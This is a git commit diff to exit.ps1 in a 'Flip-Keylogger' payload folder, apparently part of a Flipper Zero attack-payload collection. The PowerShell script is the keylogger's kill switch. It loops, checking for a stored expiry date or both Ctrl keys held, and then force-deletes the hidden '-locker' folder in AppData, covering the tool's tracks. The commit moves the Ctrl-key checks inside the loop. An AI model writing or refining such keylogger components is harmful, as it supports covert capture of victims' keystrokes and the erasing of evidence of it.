e11a06b61efacc0416595c6991b4ca02df78b9e7
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-25 23:39:08 -0600

    Update exit.ps1

--- Payloads/Flip-Keylogger/exit.ps1
+++ Payloads/Flip-Keylogger/exit.ps1
@@ -1,11 +1,12 @@
 Add-Type -AssemblyName WindowsBase
 Add-Type -AssemblyName PresentationCore
-$Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
-$Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
+
 
 Add-Type -AssemblyName PresentationCore,PresentationFramework
 
 while($true){
+$Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
+$Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
 if(((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")) -or ($Rctrl -and $Lctrl)){
 sleep 10
 Remove-Item "$env:appdata\-locker" -Recurse -Force;
